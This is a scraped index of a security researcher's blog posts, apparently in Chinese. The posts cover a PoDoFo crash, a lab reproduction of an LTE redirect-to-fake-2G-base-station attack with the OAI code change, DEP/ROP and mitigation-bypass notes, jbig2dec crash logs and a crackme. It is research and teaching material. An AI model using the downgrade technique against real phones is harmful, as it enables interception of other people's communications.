strcmp( pszToken, &quot;l&quot; ) == 0 || // l: line to strcmp( pszToken, &quot;m&quot; ) == 0 ) // m: move to { dCurPosX = stack.top().GetReal(); stack.pop(); dCurPosY = stack.top().GetReal(); stack.pop(); }......else if ( eType == ePdfContentsType_Variant ) { stack.push( var ); }I set the breakpoints and I found there had 45 ePdfContentsType_Variant but 23 MoveTo Tokens.so stack.top() will be NULL in “dCurPosY = stack.top().GetReal();”, then cause a NULL point dereference.So the upstream don’t give strict check about Path Construction Operators “MoveTo”.","link":"/2017/04/21/PoDoFo-1/"},{"title":"LTE RRCConnectionRelease Redirect问题分析","text":"这个问题是在16年被国内研究员发现提出，并实现了完整的攻击。因为这是一个很经典的问题，在学习LTE/5G安全过程中复现一下也是很有必要的。我大概是在今年初分析复现这个问题。 RRCConnectionRelease在5GNR中是RRCRelease. RRCConnectionRelease正常的使用是： 由基站发给UE，作用包括释放一个rrc connection… 基本原理当在nas层reject当前连接后，ue接收后，会触发基站发送rrcconnectionrelease给UE，此时UE会对rrcconnectionrelease包进行解析，因为本身也是连接出现问题才会触发rrcconnectionrelease，即有可能是就是基站层丢失了一开始注册入网的key等信息。因此协议上最开始的描述，UE接收后并不会对rrcconnectionrelease的完整性进行校验，而直接接收解析。 在rrcconnectionrelease中可以携带redirectedCarrierInfo结构，可以直接查看asn文件中对该结构的定义： 12345678910111213141516171819202122232425262728293031323334353637383940414243typedef struct LTE_RRCConnectionRelease_r8_IEs { LTE_ReleaseCause_t releaseCause; struct LTE_RedirectedCarrierInfo *redirectedCarrierInfo; /* OPTIONAL */ struct LTE_IdleModeMobilityControlInfo *idleModeMobilityControlInfo; /* OPTIONAL */ struct LTE_RRCConnectionRelease_v890_IEs *nonCriticalExtension; /* OPTIONAL */ /* Context for parsing across buffer boundaries */ asn_struct_ctx_t _asn_ctx;} LTE_RRCConnectionRelease_r8_IEs_t;//////typedef enum LTE_RedirectedCarrierInfo_PR { LTE_RedirectedCarrierInfo_PR_NOTHING, /* No components present */ LTE_RedirectedCarrierInfo_PR_eutra, LTE_RedirectedCarrierInfo_PR_geran, LTE_RedirectedCarrierInfo_PR_utra_FDD, LTE_RedirectedCarrierInfo_PR_utra_TDD, LTE_RedirectedCarrierInfo_PR_cdma2000_HRPD, LTE_RedirectedCarrierInfo_PR_cdma2000_1xRTT, /* Extensions may appear below */ LTE_RedirectedCarrierInfo_PR_utra_TDD_r10, LTE_RedirectedCarrierInfo_PR_nr_r15} LTE_RedirectedCarrierInfo_PR;//////typedef struct LTE_RedirectedCarrierInfo { LTE_RedirectedCarrierInfo_PR present; union LTE_RedirectedCarrierInfo_u { LTE_ARFCN_ValueEUTRA_t eutra; LTE_CarrierFreqsGERAN_t geran; LTE_ARFCN_ValueUTRA_t utra_FDD; LTE_ARFCN_ValueUTRA_t utra_TDD; LTE_CarrierFreqCDMA2000_t cdma2000_HRPD; LTE_CarrierFreqCDMA2000_t cdma2000_1xRTT; /* * This type is extensible, * possible extensions are below. */ LTE_CarrierFreqListUTRA_TDD_r10_t utra_TDD_r10; LTE_CarrierInfoNR_r15_t nr_r15; } choice; /* Context for parsing across buffer boundaries */ asn_struct_ctx_t _asn_ctx;} LTE_RedirectedCarrierInfo_t; 可以发现redirectedCarrierInfo其实是给UE提供了一个/多个可选的频率/频道/arfcn。当UE收到后会根据该信息选择一个合适的cell。(The procedure can also be used to release and redirect a UE to another frequency) 环境不影响现网，因此用oai和openair-cn搭建一个LTE网。用正常手机(UE)连接。（USRP B210+笔记本） 选用的是通过核心网/MME发送的attach reject来触发基站的RRCConnectionRelease. 初始状态的测试，attach reject选用cause 17，network failure，比较“弱”的一个cause。 oai代码不动，默认RRCConnectionRelease中是不携带redirectedCarrierInfo。修改openair-cn，当接收到第一次attach request时候，发送attach reject，cause 17；而第二次将正常处理attach request(即accept)。 搭建一个2G环境，保持运行状态。（一个Linux虚拟机+limesdr mini） 现象：UE在第一次attach reject之后，继续向LTE网络发起attach request，然后正常连接LTE网络。 添加redirectedCarrierInfooai在asn1_msg.c中，do_RRCConnectionRelease函数中，是用来构造RRCConnectionRelease包，添加redirectedCarrierInfo结构。比如我的添加： 123456789101112131415LTE_RedirectedCarrierInfo_t rInfo; // geran rInfo.present = LTE_RedirectedCarrierInfo_PR_geran; LTE_CarrierFreqsGERAN_t cfgt; cfgt.startingARFCN = 636; cfgt.bandIndicator = 0; cfgt.followingARFCNs.present = LTE_CarrierFreqsGERAN__followingARFCNs_PR_equallySpacedARFCNs; cfgt.followingARFCNs.choice.equallySpacedARFCNs.arfcn_Spacing = 1; cfgt.followingARFCNs.choice.equallySpacedARFCNs.numberOfFollowingARFCNs = 0; rInfo.choice.geran = cfgt;...... rrcConnectionRelease-&gt;criticalExtensions.choice.c1.choice.rrcConnectionRelease_r8.redirectedCarrierInfo = &amp;rInfo; arfcn和频率对应可以参考，保持和你搭建的伪基站一致即可： https://wenku.baidu.com/view/55e2d6677cd184254a35355b.html 现象是在一次attach reject之后直接连接到了搭建的2G伪基站上。 后续很早就发现的问题，但3GPP协议文档却很晚才体现添加修复。测试用的一款19年底的手机也是受影响的。 当UE收到RCCConnectionRelease/RRCRelease时，处理流程上36331和38331都有相关修改。比如36331描述如下： 12341&gt; if the RRCConnectionRelease message includes redirectedCarrierInfo indicating redirection to geran: 2&gt; if AS security has not been activated, and 2&gt; if upper layers indicate that redirect to GERAN without AS security is not allowed: 3&gt; perform the actions upon leaving RRC_CONNECTED as specified in 5.3.12, with release cause &apos;other&apos;, upon which the procedure ends; 1234561&gt; if the RRCConnectionRelease message includes redirectedCarrierInfo indicating redirection to geran; or1&gt; if the RRCConnectionRelease message includes idleModeMobilityControlInfo including freqPriorityListGERAN: 2&gt; if AS security has not been activated; and 2&gt; if upper layers indicate that redirect to GERAN without AS security is not allowed: 3&gt; ignore the content of the RRCConnectionRelease; 3&gt; perform the actions upon leaving RRC_CONNECTED or RRC_INACTIVE as specified in 5.3.12, with release cause &apos;other&apos;, upon which the procedure ends; 描述中在AS Security之后必须得有完整性保护；如果在AS Security之前的话，携带redirectedCarrierInfo字段是不会被处理的。其实也还有这么一个条件if upper layers indicate that redirect to GERAN 所以和基带的实现也有很大关系。 而在38331中，到了release 15.6.0（19年6月）才额外添加一句ignore： 1231&gt; if the AS security is not activated: 2&gt; ignore any field included in RRCRelease message except waitTime; 2&gt; perform the actions upon going to RRC_IDLE as specified in 5.3.11 with the release cause &apos;other&apos; upon which the procedure ends; 相关文档参考Forcing a Targeted LTE Cellphone into an Eavesdropping Network seeker: 伪基站高级利用技术——彻底攻破短信验证码[1] LTE RRC: TS 36331[2] 5G RRC: TS 38331","link":"/2020/09/23/RRCConnectionRelease/"},{"title":"usage of git","text":"git 基础使用1234git init #初始化一个git项目git add . #将改动添加到一个暂存区, 临时保存修改git commit -m &quot;commit info&quot; #真正的提交, 将保存修改git info #相关提交的日志信息 git 删除12git rm file #删除文件git rm -rf file #删除文件夹 git push到远程git服务器12git remote add origin (git repository)git push -u origin master git pull远程代码到本地1git pull origin master #远程master分支 git 分支管理git 分支管理基本原则, master分支仅用于实际开发环境的分支, 用于版本的管理和最后的完成版本开发的话, 使用分支develop, 因此保持两个常用分支, master和develop. 若需要调试bug等操作, 设置一个临时的分支, 用完即删除掉即可. 1234567git branch #查看当前的分支属于什么git branch a #创建一个名为a的分支, 此时a分支和当前分支内容一致git branch -b a master #创建一个分支a, 并切换到分支a, 此时a分支内容和master分支一致git checkout a #切换到分支agit merge a #将分支a合并到当前分支git branch -d a #删除分支agit branch -D a #强制删除分支a git 版本管理一般版本是在master分支上, 对一个阶段进行版本设定 12git tag v1.0 #新建一个v1.0版本git checkout v1.0 #切换到版本v1.0 git 版本回退在一些错误的过程中, 需要将版本回退 123git reflog #查看版本号信息git reset --hard HEAD^ #回退到上一个版本, 两个^^表示上上个git reset --hard (版本号)","link":"/2016/12/05/Usage-of-Git/"},{"title":"VUzzer","text":"","link":"/2017/03/17/VUzzer/"},{"title":"WebKit执行结合对应的源代码","text":"WebKitWebKit 作为浏览器内核，结构很复杂，本次主要针对于其几个核心结构进行分析，整体结构不涉及到很细节的代码实现。分析流程包括三步：1. 整体的执行流程，2. 对应源代码中的核心处理类，3. 相关部分细节介绍 HTML 解释器HTML解释器是对网页中的HTML解析的过程，最后将处理成为DOM树结构。HTML解释器的输入为网络或者本地磁盘中获取的HTML网页和资源字节流；输出为DOM树结构（WebKit技术内幕 P107）。这也是浏览器执行的最起始的步骤，当在网页中输入一个URL时，相关字节流数据将会传回给浏览器，HTML解释器将开始处理。 HTML解释器处理流程字节流处理成为字符流，可以看成就是平时我们看到的网页1234&lt;html&gt; &lt;head&gt;...&lt;/head&gt; &lt;body&gt;...&lt;/body&gt;&lt;/html&gt;然后将里面的标签、值等提取出来形成一个个词语token，然后再依据token创建节点，再将其加入到DOM树中完成DOM的构建。对应于WebKit的处理：作为框结构的处理，整个作为一个MainFrame，框里面是一个Document，Document里面可以嵌入多个子框，结构类似。所以处理的入口函数是Frame相关的处理，大致流程如下：首先是调用FrameLoader，用于框内容的加载，然后在FrameLoader中将加载DocumentLoader用于Document内容的加载；此时将调用DocumentWriter用于创建Document节点，即DOM树的根节点HTMLDocument对象；然后将调用HTMLDocumentParser解析HTML，在根节点的基础上完善DOM树，最终实现DOM树的构建。 对应源代码处理类加载过程中调用DocumentWriter来创建Document根节点:然后将得到一个DocumentParser对象，用于后面的HTML解析 在HTMLDocumentParser中解析HTML代码创建DOM树，主要流程在HTMLDocumentParser::pumpTokenizerLoop函数中，循环处理Token，具体在下图所示：主要包含三步： 从HTML字符串中提取出token 对提取的token使用XSSAuditor进行过滤 依据token进行DOM树的构建提取token主要由HTMLTokenizer类来进行处理；XSSAuditor过滤用XSSAuditor进行处理，调用filterToken函数；依据token进行DOM树构建主要有HTMLTreeBuilder类来进行处理，调用constructTree函数。下面重点看一下由token到DOM节点的插入过程。 DOM树的构建接着上面的描述，当获取到一个token时，将使用其进行DOM构建，即加入到DOM树中，入口函数为HTMLTreeBuilder::constructTree，输入的参数为token。首先是processToken，用于对token的处理这里会对token进行分类，WebKit对其一共分为了6类，假设这里为StartTag，则进入processStartTag函数进一步处理，然后依据该token需要插入的位置来进一步调用不同的函数处理，例如，判断是否在head之前，然后进一步判断是html标签或是head标签，这里为了简单分析，假设进入的token是一个body标签。那么将会进入AfterHead分支，然后进一步调用m_tree.insertHTMLBodyElement(WTFMove(token));进一步处理。这里m_tree是一个HTMLConstructionSite类的对象，因此将会由HTMLConstructionSite进行节点对象的创建，这里是body将会调用body的创建与插入。在HTMLConstructionSite类中可以发现对很多不同的元素都有相应的函数来进行处理。这里是对body处理，首先是创建一个body元素对应的对象，然后m_openElements.pushHTMLBodyElement，这里其实是维护了一个元素的栈，m_openElements是HTMLElementStack类的一个对象；这里的元素是当前有开始标识但是还没有结束标识的元素节点。一个比较形象的例子，(WebKit技术内幕 P113)当HTML包含标签片段：1&lt;body&gt;&lt;div&gt;&lt;img&gt;&lt;/img&gt;&lt;/div&gt;&lt;/body&gt;依次遇到开始标识，然后依次压栈，当”img”处理结束后，遇到”/img”结束标识，然后出栈，img元素就是div元素的子节点；以此类推。 JavaScript 解析引擎JS引擎包括两个，一个是WebKit默认的JSC(JavaScriptCore)，用于Safari里面(未验证)；一个是JS V8，用于Chrome里面。这里主要介绍的是默认的JS引擎JSC。 JSC处理的基本流程基本结构和一般的程序语言编译解释器类似。其流程如下图： 对应JSC的源代码JSC的源代码在/Source/JavaScriptCore文件夹里开始在Parser.cpp中，包含的几个关键的变量：m_lexer，用于词法分析器调用，将字符序列转成token序列，在Lexer.cpp中实现进入解析的入口函数，Parser::Parser其中source是输入的JS代码，源字符串 参考WebKit技术内幕WebKit开源代码(最后修改: 2017-09-03 Sam Weinig)WebKit vulnerability from 0 to 1 (KCon 2017)","link":"/2017/09/13/WebKit-code/"},{"title":"写在”BadPower“之后","text":"毕业后参加工作，做的第一件事就是这个，目前算是告一段落。回想起来感觉还是挺有纪念意义的。学校期间因为做的模糊测试，纯软件方面，所以一开始搞硬件走了很多弯路，陆陆续续搞了近一年，虽然是事后，其实想了想当时的过程，感觉要是再做类似于的估计能省很多时间，当时的经历还是挺有意思的。加上最近看脱口秀有点上头,老是想写点东西. 正好可以自己总结一下，要是有幸有人看到，并且觉得有些用的话那是极好的。 话说当年刚毕业，加入玄武。做点什么呢？？ xxx: 这有个快充安全研究可以做 我：快充安全？（说实话，平时背着ThinkPad那坨大电源，用着5V/1A的手机充电器，还真不知道快充是啥…..） xxx: 就是xxxxx 我：哦哦 就是搞充电器啊（其实当时内心贼迷惑，充电器也能搞，真的特佩服tk的脑洞，第一意识就是难道是用锤子。。。本着初出牛犊不怕虎，顶着好奇心~，然后就是…）可以可以，有意思 然后我就认领了 www.chongdiantou.com 兴冲冲的回到工位。”上充电头网，掌握一手充电设备评测拆解信息，无论您是想买充电器还是想做充电器，充电头网都是您的不二选择。充电头网，实在居家旅行，直播带货，必备良站“（最近真的是被脱口秀大会的蓝河绵羊奶给洗脑了…… 一度有想转行写段子的念想……）。回归正传，这不是打广告，的确是充电头网在整个研究过程中帮助很大。 划水阶段其实比较专业的术语应该叫做”研究目标与攻击面分析“。买了个某果的充电器开始”研究“，当然除了感觉真贵，手感不错，质量很好，很重很结实外，还是发现了有那么一个充电口的。所以说在不锤掉它的前提下，唯一的攻击入口就是这个小小的typec口，然后开始了很常规的调研流程了。 嗯，充电器里面有个芯片，里面有固件。 嗯，快充是协议的，快充协议有QC,VOOC…… 然后就是主流的USB PD 嗯，只有USB PD是包含数据协议的，有数据包的，协议标准是开源的，通过typec接口传输 方向确定了，usb pd协议是入口。开始啃USB PD协议文档，第一阶段先弄清楚都是咋回事。当看了协议文档之后，其实就很好奇人家充电器到底有没有实现这个，或者是不是按照这个标准实现的，其实都不好说，就一股脑想看看能不能抓到包看看到底是什么个情况。 然后就在充电头网上扒拉，发现他们开了个淘宝店，在卖一个测试设备Power-Z，其中有一款Power-Z KM001 Pro还带一个客户端软件，能够看到一些信息。当时还有个小插曲，买了之后，给发错货了，发了一个更贵的过来了，不知道咋用，其实当时也没想这么多，毕竟一个便宜的都支持，贵的就不用说了，然后在他们的测试群里问，结果不支持客户端软件。。。。客户端软件是这样的。有专门的USB PD协议包显示，但有限，只是一些比较基本的，也支持发一些比较特定的包出去。初期基本够用了，好歹是看到了实际的包长啥样了，一些也和协议对上来了。 Fuzz一下？开启第二阶段模式，他这个power-z是有个sniffer模式和一个monitor模式。一开始我是想看看某果的充电器和笔记本之间都有啥消息，所以采用monitor模式，然后相当尴尬，因为USB PD数据传输速度很快，我猜这个设备设计上是先把数据存在硬件设备的RAM里面，然后再通过USB端口发给电脑软件，但是由于太快，发现连续的几次通信之后直接崩了。相当尴尬。 然后想着还是盲测一下吧。毕竟USB PD协议并不是很复杂。就回到了上一个问题了，软件所支持发送的包就特定的那么几个，其实一开始是比较复杂的，所以就去找开发者，问问能不能给添加一个这么类似自定义任意包的功能。然后开发者说“你这个想法很好，我考虑后续添加”。 这一听就知道是没戏了，反正我也没拉下脸要一下源码，虽然知道结果也很明显。。。 只能自给自足了，使用ida+windbg“学习”了一下这个软件，软件上位机和下位机power-z的通信也就很清晰了。那么我就可以发任意包了，只要测试控制一下速度，power-z还是可以用的。发包-回复。 只剩下一个问题了，怎么知道有没有崩？ 我发现USB PD受电端是可以发送get source cap来获取充电器的供电能力的，当然崩了之后，我发送就肯定是没有回应了，所以每次发送一个测试包后，再发一个get source cap来判断是不是崩了，然后把所有的包都记录下来。因为协议规定有部分是可以厂商自定义的，所以fuzz空间是很大的，我自己设置了一些比较特殊的，比如全0，全F类似这种，然后部分随机，反正是很常规的套路。让他在那跑着，然后我就默默啃文档。下面也不记得是哪个阶段的截图了，大概样子是这样的。 结果嘛….. 无论我如何fuzz, 它自岿然不动. 然后分析了下回应包, 发现”这充电器有东西”. 就分析捣鼓,猜测,测试,把部分自定义的包的结构理清楚了,猜测哪几位干啥用的, 然后是怎么处理,怎么回. 最后得出结论…… 搞不了啊…… 过滤得太狠了, 连个信息泄露都没法弄. (后话, 后面把固件弄出来了,那部分的确和我猜测的一致). 然后怎么弄?其实前面fuzz都是啃老本,因为以前做过fuzz,比较熟悉一点. 但其实缺陷也很明显, 首先是fuzz空间太大,基本是没法所有试一试的,就算跑很长一段时间,总之枚举不靠谱(主要还有个问题,power-z跑久了有时候就没法用了……) . 其次就是我这是一个个包fuzz,充电器协议内一般都有个状态机的,要是包之间关联,基本上就gg了. 然后回到以前的问题,power-z的monitor是可以监听的,只是跑着崩了,我并不是很清楚某果自己到底干了些啥. 但目前也没啥其他好用的设备了…… 所以目前最省事的就是先看看它自己和自己设备交互到底干了些啥事情. 在偶然的机会知道了逻辑分析仪,其实搞硬件的是很清楚这个东西. 当时我一听这个东西,感觉很高级的感觉,主要是被它的名字给唬住了. 逻辑, 分析仪. 一听很高大上的样子.想着会相当复杂. 当时正好实验室的某个角落有个古老的逻辑分析仪(真的是被这个东西给坑惨了…… 其实还是自己没弄清楚……) , 为了实验一下这个神奇的玩意,买了个全套的金沙滩51单片机开发板,主要是因为代码,视频之类的都有. 然后烧了个串口通信的程序进去,用逻辑分析仪一抓, 嗯, 真香…… 下一步就是抓某果充电器和某果笔记本之间的通讯了, 想着先抓抓看看,至少得看到点东西, 然后就调阈值电压, 反正它那个就那么几个选项,不管了,一个个试一下, 然后就是 ——————————————-, 一条特别平滑的直线……. 然后就有点懵了…… 这只能说明阈值电压有问题了, 开始继续啃USB PD文档,以前都是跳过物理传输那块看的….. 嗯, BMC, 4B5B编码, 然后比较曲折的买了个LA5016, 调节阈值电压到0.45V, 可以了… 一开始图简单,把数据导出到txt,然后写了个python脚本来解析协议,看起来是这个样子的. 这个的后续话,为了方便 单独写了一个解析插件. 对后面一些分析帮助还是很大的. 长这么个样子…… 然后回归正题,抓到了一些交互, 发现其实也没啥用….. 就是获取个序列号,版本信息啥的. 基于这个也fuzz了一下,也没啥好的效果. 主要还是因为power-z的确不太好用, 后面找空基于stm32g0开发了一款, 封装了一层python接口,用起来”真香”. 长这个样子….. 用起来这个样子….. 硬件玩法?中途因为一些事情耽误了,同时也学习了硬件相关知识. 然后回过头来,可以拆了来弄了. 其实早之前已经拆了一个,当时我去试试看看还能不能正常用的时候,因为电还没放完,用手摸了一下,电得我一激灵.有点慌了…… 再加上当时对硬件还完全不了解,所以搁置了. 开始直接拆了弄,主要是还是因为在充电头网上看到了很多的拆解,然后对相关芯片也了解了很多,加上在一些开发者论坛一直混着,感觉也比较有底了. 然后是一套硬件相关搞法,其实也是比较常规的方法,只是有一些坑. 最后也弄出来了固件. 逆向分析,更新协议,漏洞,固件修改等等这一套了. 后续能控制了,能干什么? 这是个脑洞大开的过程…… 各种尝试吧,虽然最后是以”BadPower”的方式呈现. 但中间还是有很多小插曲. 一开始我测试的时候, 当时还没想太多, 只是想验证一下我修改的有没有效果, 而当时周围也没啥东西,然后就很悲剧了,把刚给发了一个智能音箱给烧了…… 然后就是…… 把MacBook的主板烧了…… 把pixel手机充电电路给弄坏了,充不了电了…… …… “那些设备没有意识到的是… 危险正在一步 一步地向它靠近……”","link":"/2020/09/24/badpower/"},{"title":"浏览器基础","text":"浏览器内核类型浏览器整体解析过程URL请求 返回请求数据 调用渲染引擎解析产生DOM树 加上样式信息产生渲染树 绘制 浏览器测试过程中的几类bug空指针0x00000000 ~ 0x0000ffff这部分内存属于系统部分，不能被访问 栈溢出这类栈溢出 因为多层递归或者死循环之类的导致栈耗尽异常代码(0xc0000fd) 栈缓冲区溢出这类为正常的溢出问题异常代码(0xc000409) 除0异常代码(0xc0000094) 内存占用过大申请内存过大 参考白帽子讲浏览器安全","link":"/2017/04/07/browser-base/"},{"title":"buffer overflow","text":"Stack常见的安全机制以及相关绕过方法 security cookies编译的时候会在运行栈RET的上面加上一个随机的4字节数值(32位系统), 该值来自于(.data节的前四个字节，并通过一定的算法计算), 在函数运行栈前面会将该值与esp进行亦或并放置在栈中, 在函数返回前会对该值进行检查. 如果该值被修改将直接异常.** 稳定利用主要思想是检查前利用(SEH, 虚表) **Linux -fno-stack-protector safeseh在异常处理器被调用时, 会先检查, 若不满足条件则不会执行检测方式(和操作系统以及编译器选项有关): 先获取栈的高地址和低地址, 通过查询TEB中的FS:[4]和FS:[8], 若指针指向该范围则不会执行. 检查是否在加载模块列表的某个模块的地址范围中, 继续检测 是否有”Load Configuration Directory”. 其余的有, 将SEH链复制一遍存储, 然后进行比较 DEP使得栈区被覆盖的位置数据不允许执行, CPU的NX(无执行页-AMD), XD(不能执行-intel)硬件DEP, 64位系统DEP总是开启, 不允许关闭(?) ROP链VirtualAlloc, VirtualProtect ASLRWindows Linux使用 echo “0” &gt; /proc/sys/kernel/randomize_va_space 关闭ASLR/proc/sys/kernel/randomize_va_space：0 关闭1 开启2 在1的基础上增加了heap随机化 Heap常见的安全机制 safe unlinkfreelists的保护** 稳定利用可以借助快表(lookaside lists) **lookaside攻击导致任意四字节写, 可以覆盖SEH, 然后执行一个除0异常导致利用 ASLR** heap spray ** DEPLinux NX：不可执行内存** rop ** 参考http://blog.sina.com.cn/s/blog_702eef6501011v07.html","link":"/2017/01/03/buffer-overflow/"},{"title":"BuTags - a chrome plugin","text":"About BuTags元旦花了一天左右从零开始写了一个chrome插件, 写这个的主要考虑是平时在电脑关机的之前chrome中打开了一些标签, 因为是临时的, 所以全部放在书签中会比较乱. 因此想将所有的标签保存, 然后下次打开浏览器的时候恢复. 今天聊着的时候发现已经存在这类功能的插件了&gt;_&lt; (OneTab)比较尴尬了, 界面功能方面都比我的好. 好吧, 还是介绍下我的这个插件的主要功能和思想吧, 包含两个功能, 保存当前Window的所有tabs, 然后不论是关机或者是重新启动浏览器, 都可以点击恢复将所有标签恢复.","link":"/2017/01/04/butags/"},{"title":"ROP - 绕过DEP VirtualProtect","text":"About DEP &amp; ROPDEP-数据执行保护, 软件DEP又称为Safe SEH, 硬件DEP主要思想是将一部分内存指定为可写但不可实行, 导致最终的shellcode无法执行. 这里介绍的是当对栈溢出进行利用时, 将shellcode布置在栈区, 因为DEP的存在导致栈区的shellcode不能执行, 此时就使用ROP链来处理DEP的情况了. 环境WinXp Sp3 开启DEP编译器 VS2015 默认开启DEP 核心思想核心思想就是通过一系列的系统指令, 使得执行Windows的VirtualProtect函数(也有其他的方式), 该函数的主要功能是能够改变指定内存地址的内存属性, 这样能够使得该部分内存地址变得可以执行. 那么通过调用该函数使得shellcode部分代码可以执行即可达到绕过DEP的效果. VirtualProtect:kernel32.dll 一般Windows程序都会加载该DLL 123456BOOL WINAPI VirtualProtect( _In_ LPVOID lpAddress, //修改的内存其实地址 _In_ SIZE_T dwSize, //修改的内存区域大小 _In_ DWORD flNewProtect, //修改后的内存属性 0x40表示可执行, 详细可查看MSDN _Out_ PDWORD lpflOldProtect //out 保存以前的内存属性); VirtualProtect()的指针覆盖EIP, 并且我们会将5个需要的参数放到栈顶, 模拟函数的调用, 先push四个参数, 然后push ret, 因此调用VirtualProtect之前函数的栈顶布局为如下:","link":"/2017/01/04/dep-rop/"},{"title":"Fuzz methods & tools","text":"主要介绍几种主流的Fuzz方式以及对应的Fuzz工具 基于文件格式基于覆盖率等反馈基于特定软件","link":"/2017/01/06/fuzzmethods-tools/"},{"title":"jbig2dec-vul","text":"两个jbig2dec漏洞 fuzzing by afl jbig2dec heap buffer overflow in function jbig2_decode_symbol_dict123456789101112131415161718192021===================================================================24598==ERROR: AddressSanitizer: heap-buffer-overflow on address 0xb5b03a80 at pc 0xb7ae9a75 bp 0xbfffd728 sp 0xbfffd2fcREAD of size 158687 at 0xb5b03a80 thread T0 #0 0xb7ae9a74 in __asan_memcpy (/usr/lib/i386-linux-gnu/libasan.so.2+0x8aa74) #1 0xb7ae9c2f in memcpy (/usr/lib/i386-linux-gnu/libasan.so.2+0x8ac2f) #2 0x80587ee in jbig2_decode_symbol_dict /home/icepng/Desktop/jbig2dec/jbig2_symbol_dict.c:644 #3 0x805af6d in jbig2_symbol_dictionary /home/icepng/Desktop/jbig2dec/jbig2_symbol_dict.c:996 #4 0x8051c35 in jbig2_parse_segment /home/icepng/Desktop/jbig2dec/jbig2_segment.c:234 #5 0x804fb91 in jbig2_data_in /home/icepng/Desktop/jbig2dec/jbig2.c:312 #6 0x804ab81 in main /home/icepng/Desktop/jbig2dec/jbig2dec.c:456 #7 0xb78c1636 in __libc_start_main (/lib/i386-linux-gnu/libc.so.6+0x18636) #8 0x8048fc0 (/home/icepng/Desktop/jbig2dec/jbig2dec+0x8048fc0)0xb5b03a80 is located 0 bytes to the right of 2048-byte region [0xb5b03280,0xb5b03a80)allocated by thread T0 here: #0 0xb7af5dee in malloc (/usr/lib/i386-linux-gnu/libasan.so.2+0x96dee) #1 0x804d6df in jbig2_default_alloc /home/icepng/Desktop/jbig2dec/jbig2.c:36 #2 0x804d781 in jbig2_alloc /home/icepng/Desktop/jbig2dec/jbig2.c:63 #3 0x804e64b in jbig2_data_in /home/icepng/Desktop/jbig2dec/jbig2.c:213 #4 0x804ab81 in main /home/icepng/Desktop/jbig2dec/jbig2dec.c:456 #5 0xb78c1636 in __libc_start_main (/lib/i386-linux-gnu/libc.so.6+0x18636)CVE-2017-7885https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7885 jbig2dec-0.13 Integer Overflow in function jbig2_image_compose123456789101112131415161718192021222324===================================================================3138==ERROR: AddressSanitizer: heap-buffer-overflow on address 0xb5c00497 at pc 0xb71c3c44 bp 0xbfdc3408 sp 0xbfdc33f8READ of size 1 at 0xb5c00497 thread T0 #0 0xb71c3c43 in jbig2_image_compose /home/icepng/icepng/jbig2dec/jbig2_image.c:281 #1 0xb71b4b9c in jbig2_decode_text_region /home/icepng/icepng/jbig2dec/jbig2_text.c:442 #2 0xb71b703c in jbig2_text_region /home/icepng/icepng/jbig2dec/jbig2_text.c:858 #3 0xb71abd0e in jbig2_parse_segment /home/icepng/icepng/jbig2dec/jbig2_segment.c:238 #4 0xb71a51a5 in jbig2_data_in /home/icepng/icepng/jbig2dec/jbig2.c:312 #5 0x80495e9 in main /home/icepng/icepng/jbig2dec/jbig2dec.c:456 #6 0xb7000636 in __libc_start_main (/lib/i386-linux-gnu/libc.so.6+0x18636) #7 0x804a03f (/home/icepng/icepng/jbig2dec/.libs/lt-jbig2dec+0x804a03f)0xb5c00497 is located 0 bytes to the right of 7-byte region [0xb5c00490,0xb5c00497)allocated by thread T0 here: #0 0xb726bdee in malloc (/usr/lib/i386-linux-gnu/libasan.so.2+0x96dee) #1 0xb71a3969 in jbig2_default_alloc /home/icepng/icepng/jbig2dec/jbig2.c:36 #2 0xb71a3ae3 in jbig2_alloc /home/icepng/icepng/jbig2dec/jbig2.c:63 #3 0xb71c2643 in jbig2_image_new /home/icepng/icepng/jbig2dec/jbig2_image.c:63 #4 0xb71b273a in jbig2_decode_symbol_dict /home/icepng/icepng/jbig2dec/jbig2_symbol_dict.c:678 #5 0xb71b273a in jbig2_symbol_dictionary /home/icepng/icepng/jbig2dec/jbig2_symbol_dict.c:996 #6 0xb71abbee in jbig2_parse_segment /home/icepng/icepng/jbig2dec/jbig2_segment.c:234 #7 0xb71a51a5 in jbig2_data_in /home/icepng/icepng/jbig2dec/jbig2.c:312 #8 0x80495e9 in main /home/icepng/icepng/jbig2dec/jbig2dec.c:456 #9 0xb7000636 in __libc_start_main (/lib/i386-linux-gnu/libc.so.6+0x18636)CVE-2017-7976https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7976","link":"/2017/04/20/jbig2dec-vul/"},{"title":"idapython","text":"idapython的一些小例子获取偏移地址所在的函数使用pin做基本块的覆盖率统计，得到的基本块一般都是”dll+偏移” 的形式，当需要引入符号文件知道基本块在哪一个函数的时候，就用到这个脚本，借用 GetFuncOffset 接口12345678910111213141516#coding=utf-8from idaapi import *def main(): print &quot;base_address: %s&quot; % hex(get_imagebase()) base_address = get_imagebase() f = open(file_path, &quot;r&quot;) for line in f: line = line.replace(&quot;\\r&quot;, &quot;&quot;).replace(&quot;\\n&quot;, &quot;&quot;) offset_addr = int(&quot;0x&quot; + line.split(&quot;+&quot;)[1], 16) addr = offset_addr + base_address print GetFuncOffset(addr)if __name__ == &quot;__main__&quot;: main()","link":"/2017/09/15/idapython/"},{"title":"kanxue crackme 1","text":"基本思路打开该程序之后，输错会出现异常的字符串，依据这些字符串追踪到sub_402120函数，大致理一下该题的思路，该函数是一个接收消息的回调函数，当接受到消息时，将进入该函数。1(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)包含四个参数，核心的是当wParam=1035时Crack成功，所以需要找到发送消息并且wParam=1035的位置，使得该语句能够被执行。12345678910if ( (unsigned __int16)wParam == 1035 ) { *(_OWORD *)v22 = xmmword_41DB98; v25 = 0; v23 = xmmword_41DBA8; v24 = xmmword_41DBB8; sub_4039D0(&amp;v26, 0, 0x96u); MessageBoxW(hWnd, v22, L&quot;Successed&quot;, 0); return 0; } 步骤一开始以为是SendMessageW函数进行消息的发送，但是查了所有对该函数的引用的位置，并没有发送wParam=1035的消息，发现最开始sub_402120函数会新开辟一个线程，执行的是StartAddress函数，因此一步一步跟进去查看发现在sub_401870函数中使用了PostMessageW发送了1035的消息。1234567891011121314151617181920if ( v26 == 2 ) // v3 0042 0050 0035 0031 { LODWORD(v35) = 0x350031; HIDWORD(v35) = &amp;unk_420050; // 00420050 v28 = v3 + 4; // 比较在这 推出 v3 然后逆回去 v36 = 0; v29 = 0; while ( *((_WORD *)&amp;v35 + v29) == *(_WORD *)v28 )// 比较进入 { ++v29; v28 += 2; if ( v29 &gt;= 4 ) // 四次 { if ( !sub_401740(v2, v3) ) // 这里一次判断 break; 